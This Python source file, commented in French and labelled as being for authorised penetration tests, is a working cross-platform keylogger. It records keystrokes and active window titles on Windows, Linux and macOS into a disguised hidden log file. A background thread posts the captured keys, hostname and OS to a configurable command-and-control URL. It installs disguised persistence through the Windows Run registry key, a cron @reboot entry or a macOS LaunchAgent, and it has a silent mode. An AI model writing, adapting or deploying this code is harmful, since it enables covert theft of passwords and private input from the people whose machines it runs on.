#!/usr/bin/env python3
"""
KeyLogger Multi-Plateforme (Windows / Linux / macOS)
Pour tests de pénétration autorisés uniquement.
"""

import os
import sys
import time
import json
import platform
import threading
import logging
from datetime import datetime

# ─── Configuration ──────────────────────────────────────────────
LOG_FILE    = os.path.join(os.path.expanduser("~"), ".cache", "syslog.dat")
C2_URL      = None               # Mettre l'URL C2 pour exfiltration
INTERVAL    = 60                 # Secondes entre les exfiltrations
STOP_KEYS   = ['esc', 'delete']  # Combinaison pour arrêter

# ─── Style de logging ───────────────────────────────────────────
if not os.path.exists(os.path.dirname(LOG_FILE)):
    os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)

logging.basicConfig(
    filename=LOG_FILE,
    level=logging.DEBUG,
    format='%(asctime)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

buffer     = []
buffer_lock = threading.Lock()
running    = True

# ─── VERSION WINDOWS (API native) ────────────────────────────────
if platform.system() == "Windows":
    import ctypes
    import ctypes.wintypes

    user32 = ctypes.windll.user32
    kernel32 = ctypes.windll.kernel32

    # Map des codes virtuels Windows → caractères
    VK_MAP = {
        0x08: "[BACKSPACE]", 0x09: "[TAB]", 0x0D: "\n",
        0x10: "[SHIFT]", 0x11: "[CTRL]", 0x12: "[ALT]",
        0x14: "[CAPSLOCK]", 0x1B: "[ESC]", 0x20: " ",
        0x2E: "[DEL]", 0x25: "[LEFT]", 0x27: "[RIGHT]",
        0x26: "[UP]", 0x28: "[DOWN]", 0x2D: "[INS]",
        0x70: "[F1]", 0x71: "[F2]", 0x72: "[F3]",
        0x73: "[F4]", 0x74: "[F5]", 0x75: "[F6]",
        0x76: "[F7]", 0x77: "[F8]", 0x78: "[F9]",
        0x79: "[F10]", 0x7A: "[F11]", 0x7B: "[F12]"
    }

    def get_foreground_window_title():
        """Récupère le titre de la fenêtre active."""
        hwnd = user32.GetForegroundWindow()
        length = user32.GetWindowTextLengthW(hwnd) + 1
        title = ctypes.create_unicode_buffer(length)
        user32.GetWindowTextW(hwnd, title, length)
        return title.value

    def win_keylogger():
        """Boucle principale Windows via GetAsyncKeyState."""
        global running
        last_keys = set()
        prev_window = ""

        while running:
            # Détecter le changement de fenêtre active
            current_window = get_foreground_window_title()
            if current_window != prev_window:
                prev_window = current_window
                with buffer_lock:
                    buffer.append(f"\n[FENETRE: {current_window}]\n")
                logging.debug(f"[FENETRE] {current_window}")

            for vk_code in range(0x01, 0xFE):
                if user32.GetAsyncKeyState(vk_code) & 0x8000:
                    if vk_code not in last_keys:
                        last_keys.add(vk_code)
                        char = VK_MAP.get(vk_code)
                        if char is None:
                            # Touches alphanumériques / ponctuation
                            char = chr(vk_code) if 0x20 <= vk_code < 0x7E else f"[{hex(vk_code)}]"

                        with buffer_lock:
                            buffer.append(char)
                        logging.debug(char)

                        # Arrêt : Insérer + Échap
                        if (user32.GetAsyncKeyState(0x1B) & 0x8000 and
                            user32.GetAsyncKeyState(0x2D) & 0x8000):
                            running = False
                            return
                else:
                    last_keys.discard(vk_code)
            time.sleep(0.015)  # ~60 FPS

# ─── VERSION LINUX / macOS (bibliothèque keyboard) ──────────────
else:
    import subprocess
    import select
    import termios
    import tty

    # Tentative d'importer keyboard, sinon fallback sur evdev
    try:
        import keyboard as kb
        HAVE_KEYBOARD = True
    except ImportError:
        HAVE_KEYBOARD = False

    if HAVE_KEYBOARD:
        def unix_keyboard_keylogger():
            """Boucle via la bibliothèque keyboard."""
            global running
            def on_key(e):
                global running
                if e.event_type == 'down':
                    key = e.name
                    if len(key) == 1:
                        with buffer_lock:
                            buffer.append(key)
                        logging.debug(key)
                    elif key == 'space':
                        with buffer_lock:
                            buffer.append(' ')
                        logging.debug(' ')
                    elif key == 'enter':
                        with buffer_lock:
                            buffer.append('\n')
                        logging.debug('\n')
                    elif key in ('backspace', 'delete'):
                        with buffer_lock:
                            buffer.append(f'[{key.upper()}]')
                        logging.debug(f'[{key.upper()}]')
                    elif key == 'tab':
                        with buffer_lock:
                            buffer.append('[TAB]')
                    else:
                        with buffer_lock:
                            buffer.append(f'[{key.upper()}]')
                        logging.debug(f'[{key.upper()}]')

                    # Vérifier arrêt
                    try:
                        if kb.is_pressed('esc') and kb.is_pressed('delete'):
                            running = False
                    except:
                        pass

            kb.on_press(on_key)
            kb.wait()

    else:
        # Fallback : lecture directe /dev/input (Linux uniquement)
        def read_evdev(device_path):
            """Parse un périphérique d'entrée Linux."""
            fmt = 'llHHI'
            event_size = struct.calcsize(fmt)
            with open(device_path, 'rb') as fd:
                while True:
                    data = fd.read(event_size)
                    if not data:
                        break
                    tv_sec, tv_usec, type_code, code, value = struct.unpack(fmt, data)
                    if type_code == 1 and value == 1:  # EV_KEY, press
                        yield code

        KEY_CODES = {
            2:'1', 3:'2', 4:'3', 5:'4', 6:'5', 7:'6', 8:'7',
            9:'8', 10:'9', 11:'0', 16:'q', 17:'w', 18:'e',
            19:'r', 20:'t', 21:'y', 22:'u', 23:'i', 24:'o',
            25:'p', 30:'a', 31:'s', 32:'d', 33:'f', 34:'g',
            35:'h', 36:'j', 37:'k', 38:'l', 44:'z', 45:'x',
            46:'c', 47:'v', 48:'b', 49:'n', 50:'m', 57:' ',
            28:'\n', 14:'[BACKSPACE]', 15:'[TAB]', 1:'[ESC]',
            56:'[ALT]', 42:'[SHIFT]', 29:'[CTRL]'
        }

        def evdev_keylogger():
            """Keylogger via lecture brute /dev/input/event*."""
            global running
            import struct

            # Trouver le périphérique clavier
            for f in os.listdir('/dev/input'):
                if f.startswith('event'):
                    path = f'/dev/input/{f}'
                    try:
                        for code in read_evdev(path):
                            char = KEY_CODES.get(code, f'[{code}]')
                            with buffer_lock:
                                buffer.append(char)
                            logging.debug(char)
                            if code == 1:  # ESC
                                running = False
                                return
                    except (PermissionError, IsADirectoryError, struct.error):
                        continue

# ─── EXFILTRATION (thread séparé) ───────────────────────────────
def exfiltrate_thread():
    """Envoie les logs vers un C2 à intervalle régulier."""
    global buffer
    while running:
        time.sleep(INTERVAL)
        with buffer_lock:
            if buffer:
                payload = {
                    "hostname": platform.node(),
                    "os": platform.system(),
                    "timestamp": datetime.now().isoformat(),
                    "keys": "".join(buffer)
                }
                try:
                    import requests
                    if C2_URL:
                        requests.post(C2_URL, json=payload, timeout=5)
                except ImportError:
                    # Pas de requests, écrire un fichier de staging
                    stage_file = LOG_FILE + ".stage"
                    with open(stage_file, "a") as f:
                        f.write(json.dumps(payload) + "\n")
                except Exception:
                    pass
                buffer = []

# ─── PERSISTENCE ─────────────────────────────────────────────────
def install_persistence():
    """Installe une persistence basique selon l'OS."""
    script_path = os.path.abspath(__file__)

    if platform.system() == "Windows":
        import winreg
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.SetValueEx(regkey, "SystemHelper", 0, winreg.REG_SZ,
                                  f'pythonw.exe "{script_path}" --silent')
            print("[*] Persistance ajoutée dans Run registry.")
        except Exception as e:
            print(f"[!] Échec persistence Windows : {e}")

    elif platform.system() == "Linux":
        cron_line = f"@reboot /usr/bin/python3 {script_path} --silent\n"
        cron_file = f"/etc/cron.d/syshelper" if os.geteuid() == 0 else os.path.expanduser("~/.config/cron")
        try:
            with open(cron_file, "a") as f:
                f.write(cron_line)
            os.chmod(cron_file, 0o644)
            print(f"[*] Persistance ajoutée dans {cron_file}")
        except Exception as e:
            print(f"[!] Échec persistence Linux : {e}")

    elif platform.system() == "Darwin":
        plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
 "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
    <key>Label</key><string>com.system.helper</string>
    <key>ProgramArguments</key><array>
        <string>/usr/bin/python3</string>
        <string>{script_path}</string>
        <string>--silent</string>
    </array>
    <key>RunAtLoad</key><true/>
</dict></plist>"""
        plist_path = os.path.expanduser("~/Library/LaunchAgents/com.system.helper.plist")
        try:
            with open(plist_path, "w") as f:
                f.write(plist_content)
            os.chmod(plist_path, 0o644)
            subprocess.run(["launchctl", "load", plist_path], check=True)
            print(f"[*] Persistance ajoutée LaunchAgent : {plist_path}")
        except Exception as e:
            print(f"[!] Échec persistence macOS : {e}")

# ─── POINT D'ENTRÉE ────────────────────────────────────────────
def main():
    global running

    # Mode silencieux (pas d'output console)
    silent = "--silent" in sys.argv

    if "--install" in sys.argv:
        install_persistence()
        return

    if not silent:
        print(f"[*] Keylogger multi-plateforme démarré")
        print(f"[*] OS détecté : {platform.system()} {platform.release()}")
        print(f"[*] Logs : {LOG_FILE}")
        print(f"[*] Appuie sur Échap + Suppr pour arrêter.")

    # Lancer le thread d'exfiltration
    if C2_URL:
        t = threading.Thread(target=exfiltrate_thread, daemon=True)
        t.start()

    # Lancer le keylogger selon l'OS
    if platform.system() == "Windows":
        win_keylogger()
    else:
        if HAVE_KEYBOARD:
            unix_keyboard_keylogger()
        else:
            if platform.system() == "Linux":
                evdev_keylogger()
            else:
                print("[!] macOS nécessite `pip install keyboard`")
                sys.exit(1)

    if not silent:
        print("[*] Keylogger arrêté.")

if __name__ == "__main__":
    main()
